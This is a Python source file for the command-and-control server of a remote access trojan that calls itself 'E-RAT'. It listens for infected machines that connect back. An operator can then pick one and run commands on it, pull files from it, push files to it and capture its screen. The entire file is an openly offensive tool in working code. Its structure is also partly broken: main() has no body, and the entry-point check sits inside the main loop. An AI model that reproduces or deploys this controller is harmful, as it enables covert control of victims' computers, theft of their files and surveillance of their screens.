import socket
import threading
import os

RED = "\033[91m"
WHITE = "\033[00m"
GREEN = "\033[92m"
PURPLE = "\033[95m"

clients = {}
active_id = None
client_id_counter = 1
lock = threading.Lock()





print(RED + """
     ########::::::::::'########:::::'###::::'########:
     ##.....::::::::::: ##.... ##:::'## ##:::... ##..::
     ##:::::::::::::::: ##:::: ##::'##:. ##::::: ##::::
     ######:::'#######: ########::'##:::. ##:::: ##::::
     ##...::::........: ##.. ##::: #########:::: ##::::
     ##:::::::::::::::: ##::. ##:: ##.... ##:::: ##::::
     ########:::::::::: ##:::. ##: ##:::: ##:::: ##::::
    ........:::::::::::..:::::..::..:::::..:::::..:::::
    """ + WHITE)






def handle_client(conn, addr, cid):
    global clients
    with lock:
        clients[cid] = {"conn": conn, "addr": addr}
    print(GREEN + f"[+] Client {cid} connected from {addr}" + WHITE)

def listen_for_clients(host, port):
    global client_id_counter
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen()
    print(PURPLE + "[+] Listening for incoming connections... \n" + WHITE)
    
    while True:
        conn, addr = server.accept()
        cid = client_id_counter
        threading.Thread(target=handle_client, args=(conn, addr, cid), daemon=True).start()
        client_id_counter += 1

def send_to_active(command):
    global active_id
    if active_id not in clients:
        print(RED + "[-] Invalid client ID." + WHITE)
        return
    try:
        conn = clients[active_id]["conn"]
        conn.send(command.encode())

        if command == "exit":
            del clients[active_id]
            return

        elif command.startswith("download "):
            filename = os.path.basename(command[9:].strip())
            filesize = conn.recv(1024).decode()

            if filesize == "FILE_NOT_FOUND":
                print(RED + "[-] File not found on client." + WHITE)
                return
            elif filesize == "ERR_OPEN_FILE":
                print(RED + "[-] Error opening file on client." + WHITE)
                return

            conn.send(b"OK")
            filesize = int(filesize)
            data = b''
            while len(data) < filesize:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
            with open(filename, "wb") as f:
                f.write(data)
            print(GREEN + f"[+] File '{filename}' downloaded successfully." + WHITE)

        elif command.startswith("upload "):
            filepath = command[7:].strip()
            if not os.path.exists(filepath):
                print(RED + "[-] Local file not found!" + WHITE)
                conn.send(b"ERR_FILE_NOT_FOUND")
                return
            with open(filepath, "rb") as f:
                content = f.read()
            conn.send(str(len(content)).encode())
            ack = conn.recv(1024)
            if ack == b"READY":
                conn.sendall(content)
                response = conn.recv(2048).decode()
                print(response)
            else:
                print(RED + "[-] Client not ready." + WHITE)

        elif command == "screenshot":
            conn.send(command.encode())
            size = conn.recv(1024).decode()
            if not size.isdigit():
                print(size)
                return
            conn.send(b"READY")
            size = int(size)
            data = b''
            while len(data) < size:
                data += conn.recv(4096)
            with open(f"screenshot_client_{active_id}.jpg", "wb") as f:
                f.write(data)
            print(GREEN + f"[+] Screenshot saved as screenshot_client_{active_id}.jpg" + WHITE)

        else:
            response = conn.recv(4096).decode()
            print(response)

    except Exception as e:
        print(RED + f"[-] Error: {e}" + WHITE)
        del clients[active_id]

def main():
    global active_id
 
print(GREEN + "-----------------------------------------------------------" + WHITE)
print(PURPLE + "[+] E-RAT started" + WHITE)

threading.Thread(target=listen_for_clients, args=("0.0.0.0", 8800), daemon=True).start()

while True:
    
    cmd = input(RED + "E-RAT>> " + WHITE).strip()
    if cmd == "list":
        for cid, info in clients.items():
            print(f"[{cid}] {info['addr']}")
    elif cmd.startswith("select "):
        try:
            target_id = int(cmd.split()[1])
            if target_id in clients:
                active_id = target_id
                print(GREEN + f"[+] Switched to client {active_id}" + WHITE)
            else:
                print(RED + "[-] Invalid client ID." + WHITE)
        except:
            print(RED + "[-] Invalid command format." + WHITE)
    elif cmd == "back":
        active_id = None
        print("[+] Returned to main menu.")
    elif active_id:
        send_to_active(cmd)
    else:
        print(RED + "[-] No client selected. Use 'list' and 'select <id>'" + WHITE)

    if __name__ == "__main__":
        main()